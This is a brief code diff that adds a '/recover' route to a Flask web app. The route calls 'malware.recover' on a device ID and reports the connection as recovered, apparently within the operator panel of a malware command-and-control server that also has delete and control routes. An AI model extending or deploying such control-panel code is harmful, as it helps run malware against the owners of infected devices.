@@ -116,6 +116,17 @@ def delete():
     except Exception as err:
         return jsonify(result=str(err)), 500
 
+@app.route("/recover", methods=["POST"])
+def recover():
+    try:
+        if not is_logged_in():
+            return redirect(url_for('login'))
+        data = request.get_json()
+        malware.recover(data["device_id"])
+        return jsonify(result='Connection was successfully recovered'), 200
+    except Exception as err:
+        return jsonify(result=str(err)), 500
+
 @app.route("/ctrl", methods=["POST"])
 def ctrl():
     try:
